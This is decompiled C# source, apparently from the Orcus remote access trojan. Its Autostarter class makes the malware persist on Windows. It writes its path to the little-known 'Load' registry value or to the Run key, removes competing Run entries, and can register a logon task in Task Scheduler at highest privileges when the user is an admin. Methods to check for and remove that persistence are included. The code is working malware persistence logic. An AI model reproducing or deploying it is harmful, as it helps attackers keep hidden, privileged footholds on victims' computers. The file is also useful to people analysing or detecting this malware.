using System;
using System.Collections.Generic;
using System.Linq;
using System.Security;
using Microsoft.Win32;
using Microsoft.Win32.TaskScheduler;
using Orcus.Config;
using Orcus.Shared.Settings;
using Orcus.Utilities;

namespace Orcus.Protection;

internal class Autostarter
{
	public static bool AddToAutostart(string filename)
	{
		return AddToAutostart(filename, inverse: false);
	}

	private static bool AddToAutostart(string filename, bool inverse)
	{
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_001d: Unknown result type (might be due to invalid IL or missing references)
		//IL_002f: Expected I4, but got Unknown
		//IL_003c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Invalid comparison between Unknown and I4
		//IL_0193: Unknown result type (might be due to invalid IL or missing references)
		//IL_019a: Expected O, but got Unknown
		//IL_01d7: Unknown result type (might be due to invalid IL or missing references)
		//IL_01dd: Invalid comparison between Unknown and I4
		//IL_01f6: Unknown result type (might be due to invalid IL or missing references)
		//IL_0200: Expected O, but got Unknown
		AutostartBuilderProperty builderProperty = Settings.GetBuilderProperty<AutostartBuilderProperty>();
		try
		{
			if (inverse)
			{
				if ((int)builderProperty.get_AutostartMethod() != 1)
				{
					goto IL_0047;
				}
				goto IL_0193;
			}
			StartupMethod autostartMethod = builderProperty.get_AutostartMethod();
			switch ((int)autostartMethod)
			{
			case 0:
				return true;
			case 1:
				goto IL_0047;
			case 2:
				goto IL_0193;
			}
			goto end_IL_0013;
			IL_0047:
			if (builderProperty.get_RegistryHiddenStart() && !filename.Contains(" "))
			{
				try
				{
					using RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows", writable: true);
					if (registryKey != null)
					{
						registryKey.SetValue("Load", filename, RegistryValueKind.String);
						return true;
					}
				}
				catch (Exception)
				{
				}
			}
			using (RegistryKey registryKey2 = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true))
			{
				if (registryKey2 != null)
				{
					List<string> list = new List<string>();
					string text = $"\"{filename}\"";
					string[] valueNames = registryKey2.GetValueNames();
					foreach (string text2 in valueNames)
					{
						if (registryKey2.GetValue(text2) is string b && string.Equals(text, b, StringComparison.OrdinalIgnoreCase) && !string.Equals(text2, builderProperty.get_RegistryKeyName(), StringComparison.OrdinalIgnoreCase))
						{
							list.Add(text2);
						}
					}
					registryKey2.SetValue(builderProperty.get_RegistryKeyName(), text, RegistryValueKind.String);
					foreach (string item in list)
					{
						registryKey2.DeleteValue(item);
					}
					return true;
				}
			}
			goto end_IL_0013;
			IL_0193:
			TaskService val = new TaskService();
			try
			{
				Task val2 = ((IEnumerable<Task>)val.get_RootFolder().get_Tasks()).FirstOrDefault((Func<Task, bool>)((Task x) => ((IEnumerable<Action>)x.get_Definition().get_Actions()).Any((Action y) => (int)y.get_ActionType() == 0 && ((ExecAction)y).get_Path() == filename)));
				if (val2 != null && (CoreHelper.RunningOnXP || !User.IsAdministrator || (int)val2.get_Definition().get_Principal().get_RunLevel() == 1))
				{
					return true;
				}
				TaskDefinition val3 = val.NewTask();
				val3.get_Triggers().Add((Trigger)new LogonTrigger());
				val3.get_Actions().Add(filename, (string)null, (string)null);
				if (builderProperty.get_TaskHighestPrivileges() && CoreHelper.RunningOnVistaOrGreater && User.IsAdministrator)
				{
					val3.get_Principal().set_RunLevel((TaskRunLevel)1);
				}
				val.get_RootFolder().DeleteTask(builderProperty.get_TaskSchedulerTaskName(), false);
				val.get_RootFolder().RegisterTaskDefinition(builderProperty.get_TaskSchedulerTaskName(), val3);
			}
			finally
			{
				((IDisposable)val)?.Dispose();
			}
			return true;
			end_IL_0013:;
		}
		catch (Exception)
		{
		}
		if (!inverse && builderProperty.get_TryAllAutostartMethodsOnFail())
		{
			return AddToAutostart(filename, inverse: true);
		}
		return false;
	}

	public static bool IsAddedToAutostart()
	{
		//IL_00ab: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b2: Expected O, but got Unknown
		//IL_00fa: Unknown result type (might be due to invalid IL or missing references)
		//IL_0123: Unknown result type (might be due to invalid IL or missing references)
		//IL_0129: Invalid comparison between Unknown and I4
		AutostartBuilderProperty builderProperty = Settings.GetBuilderProperty<AutostartBuilderProperty>();
		try
		{
			using RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows", writable: true);
			if ((string)registryKey?.GetValue("Load", null) == Consts.ApplicationPath)
			{
				return true;
			}
		}
		catch (Exception)
		{
		}
		try
		{
			using RegistryKey registryKey2 = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			if ((string)registryKey2?.GetValue(builderProperty.get_RegistryKeyName(), null) == $"\"{Consts.ApplicationPath}\"")
			{
				return true;
			}
		}
		catch (Exception)
		{
		}
		try
		{
			TaskService val = new TaskService();
			try
			{
				Task val2 = val.FindTask(builderProperty.get_TaskSchedulerTaskName(), false);
				Action val3 = ((IEnumerable<Action>)val2.get_Definition().get_Actions()).FirstOrDefault((Func<Action, bool>)((Action x) => (int)x.get_ActionType() == 0));
				if (val3 != null && ((ExecAction)val3).get_Path() == Consts.ApplicationPath && (!User.IsAdministrator || (int)val2.get_Definition().get_Principal().get_RunLevel() == 1))
				{
					return true;
				}
			}
			finally
			{
				((IDisposable)val)?.Dispose();
			}
		}
		catch (Exception)
		{
		}
		return false;
	}

	public static bool RemoveFromAutostart()
	{
		//IL_00d6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00dd: Expected O, but got Unknown
		//IL_0134: Unknown result type (might be due to invalid IL or missing references)
		bool result = false;
		try
		{
			using RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows", writable: true);
			if ((string)registryKey?.GetValue("Load", null) == Consts.ApplicationPath)
			{
				registryKey.DeleteValue("Load", throwOnMissingValue: false);
				result = true;
			}
		}
		catch (SecurityException)
		{
		}
		try
		{
			using RegistryKey registryKey2 = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			if (registryKey2 != null)
			{
				string b = $"\"{Consts.ApplicationPath}\"";
				string[] valueNames = registryKey2.GetValueNames();
				foreach (string name in valueNames)
				{
					if (registryKey2.GetValue(name) is string a && string.Equals(a, b, StringComparison.OrdinalIgnoreCase))
					{
						registryKey2.DeleteValue(name);
						result = true;
					}
				}
			}
		}
		catch (Exception)
		{
		}
		try
		{
			TaskService val = new TaskService();
			try
			{
				foreach (Task allTask in val.get_RootFolder().get_AllTasks())
				{
					Action val2 = ((IEnumerable<Action>)allTask.get_Definition().get_Actions()).FirstOrDefault((Func<Action, bool>)((Action x) => (int)x.get_ActionType() == 0));
					if (val2 != null && ((ExecAction)val2).get_Path() == Consts.ApplicationPath)
					{
						try
						{
							val.get_RootFolder().DeleteTask(allTask.get_Name(), true);
							result = true;
						}
						catch (Exception)
						{
						}
					}
				}
				return result;
			}
			finally
			{
				((IDisposable)val)?.Dispose();
			}
		}
		catch (Exception)
		{
			return result;
		}
	}
}
